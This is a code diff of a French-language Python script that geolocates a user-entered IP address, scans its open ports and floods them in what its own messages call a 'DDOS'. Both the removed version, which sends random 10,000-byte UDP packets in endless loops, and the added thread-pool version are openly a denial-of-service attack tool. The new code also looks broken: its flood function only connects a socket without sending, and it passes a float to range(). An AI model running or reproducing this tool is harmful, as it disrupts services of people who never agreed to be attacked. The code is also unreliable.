@@ -1,6 +1,5 @@
 import socket
 import sys
-import random
 import ipv4
 import pyfiglet
 import concurrent.futures
@@ -13,38 +12,43 @@ def main():
     print("-" * 60)
     ip = input("Entrez une adresse ip :")
     if not ipv4.exist(ip):
-        print("[Erreur] L'adresse ip n'éxiste pas")
+        print(f"[Erreur] Une erreur s'est produite.")
+        input("Appuyer sur Entrer pour terminer...")
         sys.exit()
     if not socket.gethostbyname(ip) == ip:
         print(f"{ip}: {socket.gethostbyname(ip)}")
-    print(f"City: {ip_socket(socket.gethostbyname(ip)).city}")
-    print(f"Coordonate: {ip_socket(socket.gethostbyname(ip)).latlng}")
+    print(f"Ville: {ip_socket(socket.gethostbyname(ip)).city}")
+    print(f"Coordonée: {ip_socket(socket.gethostbyname(ip)).latlng}")
+
     print("-" * 60)
 
-    def run(port, line):
+    def ddos(port):
         target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         target.connect((ip, port))
-        nmb = 0
+
+    def run(port, speed):
         while True:
-            nmb += 1
-            target.send(random._urandom(10 ** 4))
-            space = "\n"*line
-            print(f"{space}[{ip}:{port}] {nmb} packages send", end="\r")
+            with concurrent.futures.ThreadPoolExecutor(max_workers=speed) as executor:
+                for i in range(speed):
+                    executor.submit(ddos, port)
 
+    print("Scan des ports estimé à environ 4 minutes...")
     opened_port = ipv4.scan(ip)
-
-    with open(f"historique.log", "a+") as file:
-        file.write(f"{ip}: {opened_port}\n")
 
     for port in opened_port:
         print(f"[+]{ip}:{port}")
-
+    print("\n")
     if len(opened_port) != 0:
         with concurrent.futures.ThreadPoolExecutor(max_workers=len(opened_port)) as executor:
-            nmb = 0
             for port in opened_port:
-                executor.submit(run, port, nmb)
-                nmb += 1
+                print(f"[{ip}:{port}] DDOS en cours...")
+                executor.submit(run, port, 1000/len(opened_port))
+
+    else:
+        print(f"Aucun port ouvert n'a été trouvé sur {ip}.")
+        input("Appuyer sur Entrer pour terminer...")
+        sys.exit()
+
 
 if __name__ == "__main__":
     main()
